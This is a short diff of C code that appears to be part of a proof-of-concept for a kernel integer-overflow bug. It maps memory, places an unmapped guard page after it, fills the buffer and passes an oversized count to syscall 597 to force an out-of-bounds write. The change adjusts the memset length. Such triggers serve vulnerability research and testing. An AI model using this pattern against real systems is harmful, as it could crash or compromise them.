@@ -502,7 +502,7 @@ int64_t count = (0x100000000 + bufferSize) / 4;
 uint8_t *mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
 munmap(mapping + mappingSize, PAGE_SIZE);
 
-memset(mapping + bufferSize, 'a', mappingSize);
+memset(mapping + bufferSize, 'a', overflowSize);
 
 int result = syscall(597, 1, mapping, &count);
 printf("Result: %d\n", result);
